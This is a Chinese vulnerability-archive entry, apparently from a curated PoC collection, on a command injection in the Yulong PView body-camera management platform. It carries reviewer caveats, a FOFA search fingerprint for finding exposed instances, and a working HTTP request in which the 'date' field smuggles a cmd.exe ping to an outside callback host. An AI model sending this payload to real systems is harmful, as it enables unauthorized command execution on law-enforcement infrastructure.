---
source: "wy876 漏洞文库"
title: "誉龙PView执法记录仪管理 Third TimeSyn date命令注入"
product: "誉龙PView执法记录仪管理"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Windows cmd环境；版本未知"
prerequisites: "带JSESSIONID，cloudKey=0x0前提未说明"
side_effects: "在线解密或外部服务可能收到凭据及敏感内容"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/tory9ats6o7dd65g"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F/%E8%AA%89%E9%BE%99%E6%95%B0%E5%AD%97%E6%89%A7%E6%B3%95%E8%AE%B0%E5%BD%95%E4%BB%AA%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0TimeSyn%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md"
fofa: "body=\"PView 视音频管理平台\""
fofa_unverified: "body="
id: "vw-cbe95f6d501da8fc45c006e9"
entity_id: "ve-cbe95f6d501da8fc45c006e9"
schema_version: "1"
---

# 誉龙PView执法记录仪管理 Third TimeSyn date命令注入

## 条目说明

- 对象与具体问题：誉龙PView执法记录仪管理；Third TimeSyn date命令注入
- 版本、配置及部署条件：Windows cmd环境；版本未知
- 认证与权限前提：带JSESSIONID，cloudKey=0x0前提未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- PHP入口带Java会话可能残留/混合栈，需无登录对照，不能据此称匿名
- 时间同步功能可能修改时间，载荷外部ping无回调结果
- Content-Length96与短正文不符，HTTP误标Go
- 缺固件/版本/根因/修复，不能泛化所有PView部署

## 操作风险

在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
誉龙数字执法记录仪管理平台是深圳誉龙数字技术有限公司开发的执法记录仪管理平台，该平台存在远程命令执行漏洞，攻击者可以利用该漏洞执行任意命令，这可能导致对系统进行未经授权的操作，例如创建、修改或删除文件、执行系统命令、安装恶意软件等。

## 二、影响版本
+ 誉龙数字执法记录仪管理平台

## 三、资产测绘
+ fofa`body="PView 视音频管理平台"`
+ 特征


## 四、漏洞复现
```http
POST /index.php?r=Third/TimeSyn HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Host: 
Cookie: JSESSIONID=AB3CC11444E566879F70BE78C0C518CA
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 96

cloudKey=0x0&date=|cmd.exe+/c+ping jzogguorui.dgrh3.cn&time=1
```

> 请求长度说明：原资料 Content-Length 为 96；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tory9ats6o7dd65g>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
